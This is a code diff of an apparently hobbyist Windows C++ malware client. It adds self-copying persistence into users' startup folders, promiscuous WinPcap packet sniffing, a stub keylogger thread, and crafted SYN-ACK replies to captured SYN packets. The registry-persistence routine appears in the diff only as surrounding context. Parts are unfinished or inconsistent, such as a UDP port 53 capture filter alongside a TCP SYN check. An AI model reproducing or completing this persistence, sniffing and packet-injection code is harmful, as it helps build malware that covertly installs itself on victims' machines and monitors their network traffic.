@@ -12,6 +12,7 @@
 #include <pcap.h>
 #include <bitset>
 #include <IPHlpApi.h>
+#include <fstream>
 
 #define MAX_THREADS 2
 CRITICAL_SECTION HandleLock;
@@ -104,6 +105,105 @@ typedef struct eth_header {
 	u_short type;
 }eth_header;
 
+//function prototypes
+int reg_maker();
+void split(const std::string& s, char delim, std::vector<std::string>& v);
+void remover(std::vector<std::string>& v);
+int matcher(char firstletter);
+std::string parser(const std::string res, std::vector<std::string> v);
+std::string find_curr_dir();
+int startup_finder();
+int size_of_list(pcap_if_t*  list);
+pcap_t* get_handle(pcap_if_t** first_device);
+void decapsulate(const u_char *data, int size);
+pcap_if_t* capture_em_packets();
+void get_mac(mac_values** values);
+void ipv4_address(std::vector<std::string>& lines_vect, std::vector<std::string>& ip_addresses);
+void get_ip(std::vector<std::string>& ip_addresses);
+int send_packet(std::string address, std::string mac_addr, std::string option);
+
+/*
+ *This is the capture thread
+ *returns:
+ */
+DWORD WINAPI capture(PVOID pPARAM) {
+	//captures packets using winpcap driver
+	pcap_if_t* device = capture_em_packets();//device is pointer to list of devices
+
+	pcap_t* adhandle;					//stores the handle created by pcap_open for pcap_next_ex to read packets
+	struct pcap_pkthdr *pktHeader;		//stores packet header information
+	const u_char *pkt_data;				//stores packet data
+	char error_msg[PCAP_ERRBUF_SIZE];	//error message buffer
+	struct bpf_program opcode;			//this will contain useful shit
+	u_int netmask;						//this will contain the netmask of the interface capturing
+
+										//open dev list
+	if ((adhandle = pcap_open(device->name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, error_msg)) == NULL) {
+		pcap_freealldevs(device);
+		return -1;
+	}
+
+	//compile filter
+	netmask = ((struct sockaddr_in*) (device->addresses->netmask))->sin_addr.S_un.S_addr;
+	if (pcap_compile(adhandle, &opcode, "ip proto \\udp and port 53", 1, netmask) < 0) {
+		pcap_freealldevs(device);
+		return -1;
+	}
+
+	//set filter
+	if (pcap_setfilter(adhandle, &opcode) < 0) {
+		pcap_freealldevs(device);
+		return -1;
+	}
+
+	//free dev list
+	pcap_freealldevs(device);
+
+	//capture packets on dev
+	/////////infinite loop need to change///////////
+	while (pcap_next_ex(adhandle, &pktHeader, &pkt_data) >-1) {
+
+		//inspect packet
+		if (pktHeader->len > 0) {
+			decapsulate(pkt_data, pktHeader->caplen);
+		}
+	}
+	///////////////////////////////////////////////
+	return 0;
+}
+
+/*
+ *This will run the key logger
+ *returns:
+ */
+DWORD WINAPI keg_logging(PVOID pPARAM) {
+	return 0;
+}
+
+/*
+ *
+ */
+int main()
+{
+	//Implements persistence by copying itself to startup folder
+	//redirect output into stdout to buffer via pipe
+	startup_finder();
+
+	InitializeCriticalSection(&HandleLock);
+
+	//trying the multithreaded prog
+	DWORD id;
+	HANDLE hCapture = CreateThread(NULL, 0, capture, (PVOID)1, 0, &id);
+	//HANDLE hSender = CreateThread(NULL, 0, command_console, (PVOID)2, 0, &id);
+
+	//Wait for objects
+	//WaitForSingleObject(hSender, INFINITE);
+
+	int temp = 0;
+	std::cin >> temp;
+	return 0;
+}
+
 /*
 * This function will edit registries in order to
 * obtain persistence for the client and check to
@@ -145,10 +245,10 @@ int reg_maker() {
 }
 
 /*
- *This function will split a string based on
- *the character to passed to it and insert the
- *parts into a vector
- */
+*This function will split a string based on
+*the character to passed to it and insert the
+*parts into a vector
+*/
 void split(const std::string& s, char delim, std::vector<std::string>& v) {
 	std::string::size_type i = 0;
 	std::string::size_type j = s.find(delim);
@@ -164,8 +264,8 @@ void split(const std::string& s, char delim, std::vector<std::string>& v) {
 }
 
 /*
- *remove the spaces from each string in the vector
- */
+*remove the spaces from each string in the vector
+*/
 void remover(std::vector<std::string>& v) {
 	for (int i = 0; i < v.size(); i++) {
 		std::string getting_changed = v[i];
@@ -180,9 +280,9 @@ void remover(std::vector<std::string>& v) {
 }
 
 /*
- *Checks to see in character matched
- *a character in the alphabet or used for directories
- */
+*Checks to see in character matched
+*a character in the alphabet or used for directories
+*/
 int matcher(char firstletter) {
 	std::string alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\\._:0123456789";
 	int res = alphabet.find(firstletter);
@@ -191,14 +291,14 @@ int matcher(char firstletter) {
 }
 
 /*
- *This will parse the output of a dir command
- *and return a vector of Users directories
- */
+*This will parse the output of a dir command
+*and return a vector of Users directories
+*/
 std::string parser(const std::string res, std::vector<std::string> v) {
 	std::string directories = "";
 	split(res, '\n', v);
 	remover(v);
-	
+
 	for (int i = 0; i < v.size(); i++) {
 		int temp = v[i].find('>');
 		if (temp == 21) {
@@ -211,13 +311,13 @@ std::string parser(const std::string res, std::vector<std::string> v) {
 		}
 		directories += " ";
 	}
-	
+
 	return directories;
 }
 
 /*
- *Finds the current path of the program
- */
+*Finds the current path of the program
+*/
 std::string find_curr_dir() {
 	char Path[FILENAME_MAX];
 	std::string exePath = "";
@@ -226,8 +326,8 @@ std::string find_curr_dir() {
 	HMODULE hmodule = GetModuleHandle(NULL);
 	if (hmodule != NULL) {
 		//When passing NULL to GetModuleHandle, it returns handle of exe itself
-		GetModuleFileName(hmodule, (LPTSTR) Path, (sizeof(Path)));
-		
+		GetModuleFileName(hmodule, (LPTSTR)Path, (sizeof(Path)));
+
 		//Parses the Character array
 		for (int i = 0; i < 260; i++) {
 			if (matcher(Path[i]) != -1) {
@@ -246,9 +346,9 @@ std::string find_curr_dir() {
 }
 
 /*
- *This function prints the directories/files of the Users
- *directory and sends them to the char buffer via the pipe
- */
+*This function prints the directories/files of the Users
+*directory and sends them to the char buffer via the pipe
+*/
 int startup_finder() {
 	const char* cmd = "dir C:\\Users";
 	char buffer[128];
@@ -264,19 +364,19 @@ int startup_finder() {
 	if (!_pipe) {
 		std::cout << "ERROR" << std::endl;
 	}
-	
+
 	while (!feof(_pipe)) {
 		if (fgets(buffer, 128, _pipe) != NULL)
 			result += buffer;
 	}
 	_pclose(_pipe);
 
-	
+
 	/*
-	 *Parses result and Splits result string by spaces
-	 *Loops parts vector to find elements that contain
-	 *directories then copies the exe to those directories
-	 */
+	*Parses result and Splits result string by spaces
+	*Loops parts vector to find elements that contain
+	*directories then copies the exe to those directories
+	*/
 	result = parser(result, parts);
 	split(result, ' ', parts);
 	for (int i = 0; i < parts.size(); i++) {
@@ -294,10 +394,10 @@ int startup_finder() {
 }
 
 /*
- *This function will find the size of lists created by functions in wpdpack libs
- *list: should be the first point of a pcap interface list
- *returns: the size of the list parameter
- */
+*This function will find the size of lists created by functions in wpdpack libs
+*list: should be the first point of a pcap interface list
+*returns: the size of the list parameter
+*/
 int size_of_list(pcap_if_t*  list) {
 	int size = 0;
 
@@ -348,10 +448,10 @@ pcap_t* get_handle(pcap_if_t** first_device) {
 }
 
 /*
- *This function will decapsulate packets
- *and call functions if needed
- *renturns nothing 
- */
+*This function will decapsulate packets
+*and call functions if needed
+*renturns nothing
+*/
 void decapsulate(const u_char *data, int size) {
 	eth_header* eth_hdr;
 	eth_hdr = (eth_header*)data;
@@ -359,57 +459,78 @@ void decapsulate(const u_char *data, int size) {
 	u_int head_len;
 	tcp_head* th;
 	//udp_header* uh;
-	u_short sport;
-	u_short dport;
+	//u_short sport;
+	//u_short dport;
 
 	if (ntohs(eth_hdr->type) == 0x800) {
 		// retireve the position of the ip header
 		ih = (IPv4 *)(data + 14); //length of ethernet header
 		int length = (int)ih->ver_ihl - 64;
-		
-		// print ip addresses
-		printf("%d.%d.%d.%d -> %d.%d.%d.%d\n",
-			ih->saddr.byte1,
-			ih->saddr.byte2,
-			ih->saddr.byte3,
-			ih->saddr.byte4,
-			ih->daddr.byte1,
-			ih->daddr.byte2,
-			ih->daddr.byte3,
-			ih->daddr.byte4);
 
-		//get tcp header
-		head_len = (ih->ver_ihl & 0xf) * 4;			//length of ip header
-		th = (tcp_head *)((u_char*)ih + head_len);
+		if (length > 5) {
+			//get ip address as string
+			std::string address = "";
+			char octet[4];
+			_itoa_s((int)ih->saddr.byte1, octet, 10);
+			address = address + octet + '.';
+			_itoa_s((int)ih->saddr.byte2, octet, 10);
+			address = address + octet + '.';
+			_itoa_s((int)ih->saddr.byte3, octet, 10);
+			address = address + octet + '.';
+			_itoa_s((int)ih->saddr.byte4, octet, 10);
+			address = address + octet;
+
+			//get mac address as string
+			std::string mac_address = "";
+			char byte[4];
+			_itoa_s((int)eth_hdr->src[0], byte, 10);
+			mac_address = mac_address + byte + ':';
+			_itoa_s((int)eth_hdr->src[1], byte, 10);
+			mac_address = mac_address + byte + ':';
+			_itoa_s((int)eth_hdr->src[2], byte, 10);
+			mac_address = mac_address + byte + ':';
+			_itoa_s((int)eth_hdr->src[3], byte, 10);
+			mac_address = mac_address + byte + ':';
+			_itoa_s((int)eth_hdr->src[4], byte, 10);
+			mac_address = mac_address + byte + ':';
+			_itoa_s((int)eth_hdr->src[5], byte, 10);
+			mac_address = mac_address + byte;
+
+			if ((int)ih->proto == 6) {
+				//get tcp header
+				head_len = (ih->ver_ihl & 0xf) * 4;//length of ip header
+				th = (tcp_head *)((u_char*)ih + head_len);
+
+				//check control bit number for syn packet
+				if ((int)th->flag == 2) {
+					//send syn ack
+					send_packet(address, mac_address, "1");
+				}
+			}
+		}
 
 		//get udp header = pointer + length of ipheader
 		/*head_len = (ih->ver_ihl & 0xf) * 4;//length of ip header
 		uh = (udp_header *)((u_char*)ih + head_len);*/
 
-		//convert form network byte order to host byte order
-		std::cout << (int)th->flag << std::endl;
-		sport = ntohs(th->sport);
-		dport = ntohs(th->dport);
-
-		std::cout << "source " << sport << "dest " << dport << "length " << head_len << std::endl;
 
 	}
 }
 
 /*
- *This function returns the device to capture on
- *returns: device if successful otherwise returns NULL
- */
+*This function returns the device to capture on
+*returns: device if successful otherwise returns NULL
+*/
 pcap_if_t* capture_em_packets() {
 	pcap_if_t* all_devices;				//first point of interface list
 	char error_msg[PCAP_ERRBUF_SIZE];	//error message buffer
 
-	//returns on error
+										//returns on error
 	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &all_devices, error_msg) == -1) {
 		std::cout << "did not get device list" << std::endl;
 		return NULL;
 	}
-	
+
 	//returns if no interfaces
 	if (size_of_list(all_devices) == 0) {
 		return NULL;
@@ -418,7 +539,7 @@ pcap_if_t* capture_em_packets() {
 	//select interface
 	//In this case inteface selected is the second interface
 	pcap_if_t* device = all_devices;
-	if(device != NULL)
+	if (device != NULL)
 		return device;
 
 	return NULL;
@@ -522,7 +643,7 @@ int send_packet(std::string address, std::string mac_addr, std::string option) {
 	mac_values* values = (mac_values*)malloc((sizeof(int) * 6));
 	mac_values* mac_address = (mac_values*)malloc((sizeof(int) * 6));
 	get_mac(&values);
-	u_char packet[42];
+	u_char packet[62];
 
 	std::vector<std::string> mac_val;
 	split(mac_addr, ':', mac_val);
@@ -556,15 +677,29 @@ int send_packet(std::string address, std::string mac_addr, std::string option) {
 	int size = 0;
 	if (option == "1") {
 		packet[14] = 70;
-		size = 38;
+		size = 58;
 		//need to set option length
 		for (int i = 34; i < 38; i++) {
 			packet[i] = i % 256;
 		}
+		//sending ack packet
+		std::ifstream myfile("syn_ack_tcp_header.txt");
+		if (myfile.is_open()) {
+			std::string line;
+			getline(myfile, line);
+			std::vector<std::string> bytes;
+			split(line, ' ', bytes);
+			int index = 0;
+			for (int i = 38; i < 58; i++) {
+				packet[i] = atoi(bytes[index].c_str());
+				index++;
+			}
+			myfile.close();
+		}
 	}
 	else if (option == "2") {
 		packet[14] = 71;
-		size = 42;
+		size = 62;
 		//need to set option length
 		for (int i = 34; i < 42; i++) {
 			packet[i] = i % 256;
@@ -643,86 +778,3 @@ int send_packet(std::string address, std::string mac_addr, std::string option) {
 
 	return 0;
 }
-
-/*
- *This is the capture thread
- *returns:
- */
-DWORD WINAPI capture(PVOID pPARAM) {
-	//captures packets using winpcap driver
-	pcap_if_t* device = capture_em_packets();//device is pointer to list of devices
-
-	pcap_t* adhandle;					//stores the handle created by pcap_open for pcap_next_ex to read packets
-	struct pcap_pkthdr *pktHeader;		//stores packet header information
-	const u_char *pkt_data;				//stores packet data
-	char error_msg[PCAP_ERRBUF_SIZE];	//error message buffer
-	struct bpf_program opcode;			//this will contain useful shit
-	u_int netmask;						//this will contain the netmask of the interface capturing
-
-										//open dev list
-	if ((adhandle = pcap_open(device->name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, error_msg)) == NULL) {
-		pcap_freealldevs(device);
-		return -1;
-	}
-
-	//compile filter
-	netmask = ((struct sockaddr_in*) (device->addresses->netmask))->sin_addr.S_un.S_addr;
-	if (pcap_compile(adhandle, &opcode, "ip proto \\udp and port 53", 1, netmask) < 0) {
-		pcap_freealldevs(device);
-		return -1;
-	}
-
-	//set filter
-	if (pcap_setfilter(adhandle, &opcode) < 0) {
-		pcap_freealldevs(device);
-		return -1;
-	}
-
-	//free dev list
-	pcap_freealldevs(device);
-
-	//capture packets on dev
-	/////////infinite loop need to change///////////
-	while (pcap_next_ex(adhandle, &pktHeader, &pkt_data) >-1) {
-
-		//inspect packet
-		if (pktHeader->len > 0) {
-			decapsulate(pkt_data, pktHeader->caplen);
-		}
-	}
-	///////////////////////////////////////////////
-	return 0;
-}
-
-/*
- *This will run the key logger
- *returns:
- */
-DWORD WINAPI keg_logging(PVOID pPARAM) {
-	return 0;
-}
-
-/*
- *
- */
-int main()
-{
-	//Implements persistence by copying itself to startup folder
-	//redirect output into stdout to buffer via pipe
-	startup_finder();
-
-	InitializeCriticalSection(&HandleLock);
-
-	//trying the multithreaded prog
-	DWORD id;
-	HANDLE hCapture = CreateThread(NULL, 0, capture, (PVOID)1, 0, &id);
-	//HANDLE hSender = CreateThread(NULL, 0, command_console, (PVOID)2, 0, &id);
-
-	//Wait for objects
-	//WaitForSingleObject(hSender, INFINITE);
-
-	int temp = 0;
-	std::cin >> temp;
-	return 0;
-}
-
